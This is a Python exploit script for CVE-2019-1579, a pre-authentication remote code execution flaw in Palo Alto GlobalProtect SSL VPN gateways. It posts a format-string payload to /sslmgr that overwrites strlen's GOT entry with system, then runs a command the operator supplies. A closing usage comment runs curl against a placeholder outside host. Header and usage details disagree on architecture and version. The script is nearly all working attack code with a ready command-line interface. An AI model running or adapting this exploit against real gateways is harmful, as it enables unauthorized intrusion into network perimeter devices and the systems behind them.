#!/usr/bin/python
# Palo Alto RCE - MIPS - 8.0.7 (CVE-2019-1579)
#
# Based on https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
#
# Dependencies:
#   pip install requests
#
# Author: b0yd

import requests
import sys
import struct
import argparse

requests.packages.urllib3.disable_warnings()

def exploit(ip, cmd):

    url = "https://%s/sslmgr" % ip

    strlen_GOT = 0x626410
    system_PLT = 0x407110

    # Address to write to
    palo_host_addr = strlen_GOT #strlen GOT
    palo_str = struct.pack("<Q", palo_host_addr+3)
    palo_safe = palo_str.replace("\x00","%10$c")
    palo_str2 = struct.pack("<Q", palo_host_addr+2)
    palo_safe2 = palo_str2.replace("\x00","%10$c")
    palo_str3 = struct.pack("<Q", palo_host_addr)
    palo_safe3 = palo_str3.replace("\x00","%10$c")

    # Address being written
    ampresand = system_PLT #system PLT
    fmt = '%70$n'
    fmt += '%' + str((ampresand>>16)&0xff) + 'c'
    fmt += '%24$hhn'
    fmt += '%' + str((ampresand&0xffff)-((ampresand>>16)&0xff)) + 'c'
    fmt += '%32$hn'

    data = "scep-profile-name=" # Offset 24
    data += palo_safe2
    data += "&appauthcookie="
    data += palo_safe3          # Offset 32
    data += "&host-id="
    data += palo_safe           # Offset 70
    data += "&user-email="
    data += fmt
    data += "&user="
    data += cmd

    r = requests.post(url, data=data, verify=False)
    out = r.text
    print out

def exec_cmd(ip, cmd):

    url = "https://%s/sslmgr" % ip

    data = "scep-profile-name="
    data += cmd

    r = requests.post(url, data=data, verify=False)
    out = r.text
    print out

parser = argparse.ArgumentParser(description='Send an email.')
parser.add_argument('-i', dest='ip', help='IP Address of the Palo Alto Global Protect Gateway.', required=True)
parser.add_argument('-c', dest='cmd', help='Command to run', required=True)
parser.add_argument('-e', dest='exploit_srv', help='Exploit server. (Swaps strlen and system)', action='store_true')
parser.set_defaults(exploit_srv=True)

args = parser.parse_args()
ip = args.ip
cmd = args.cmd

# Run exploit or just send cmd as arg
if args.exploit_srv:
    exploit(ip, cmd)
else:
    exec_cmd(ip, cmd)

# python CVE-2019-1579_8.0.5_x64.py -i 192.168.1.88 -c "curl http://xx.xx.xx.xx:8000"